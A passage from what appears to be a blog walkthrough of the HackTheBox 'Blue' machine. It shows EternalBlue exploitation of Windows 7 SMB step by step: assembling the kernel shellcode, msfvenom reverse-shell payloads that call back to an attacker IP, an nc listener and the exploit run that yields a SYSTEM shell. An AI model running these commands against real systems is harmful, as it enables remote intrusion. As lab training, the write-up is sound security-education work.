<p><strong>Eternalsynergy</strong> requires access to named pipe. I believe this exploit is modified from Eternalromance to target Windows 8 and later. Eternalsynergy uses another bug for info leak and does some trick to find executable memory (I do not know how it works because I read only output log and pcap file).</p>
</blockquote>
<p>Remember or recon phase and that Blue machine name? Looks like we are facing EternalBlue : we have seen that we have access to $IPC Share, Windows &lt; 8 (Windows 7 here), and port 445/tcp is open.</p>
<p>In order to exploit this we need to use the following (still according to the repo) :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">eternalblue_exploit7.py &lt;ip&gt; &lt;shellcode_file&gt; [numGroomConn]
</code></pre></td></tr></table>
</div>
</div><p>The repo tells us that there is 2 shellcode, one for each arch.</p>
<p>However, we are not really sure which arch is our target. So we will assemble both shellcode :</p>
<p>cd into the shellcode dir and :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">nasm -f bin eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
</code></pre></td></tr></table>
</div>
</div><p>Once this is done, we create our payloads like so :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">msfvenom -p windows/shell_reverse_tcp LHOST=$attacker_ip LPORT=4444 -f raw -o sc_x86_msf.bin EXITFUNC=thread msfvenom -p windows/x64/shell_reverse_tcp LHOST=$attacker_ip LPORT=4444 -a x64 -f raw -o sc_x64_msf.bin EXITFUNC=thread
</code></pre></td></tr></table>
</div>
</div><p>Finally we &ldquo;join&rdquo; the two payloads together (with the provided python script from the repo) so that we can check both arch at the same time and hopefully get a shell :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">cat sc_x86_kernel.bin sc_x86_msf.bin &gt; sc_x86.bin cat sc_x64_kernel.bin sc_x64_msf.bin &gt; sc_x64.bin python2 eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
</code></pre></td></tr></table>
</div>
</div><p><a href="https://redteamzone.com/EternalBlue/" target="_blank" rel="noopener noreffer ">Many thanks to this website for the info on how to assemble the shellcode</a>.</p>
<p>Now start a listener to receive the reverse shell on port 4444 (or the one you used with he msfvenom command):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">nc -lvp 4444
</code></pre></td></tr></table>
</div>
</div><p>Let it open and finally, we run our command with the generated sc_all.bin as payload :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">python2 eternalblue_exploit7.py $target_ip ./shellcode/sc_all.bin
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>Bingo, we have a shell as <code>SYSTEM</code>!</p>
<p></p>
<p>Here, in a normal pentest situation, we would make sure to have a way to maintain access. But this is HackTheBox, we will simply harvest our flags. :)</p>
<h2 id="maintaining-access">Maintaining Access</h2>
<p>Not used here. :)</p>
<h2 id="covering-tracks">Covering Tracks</h2>
<p>Not used here. :)</p>
]]></description></item></channel></rss>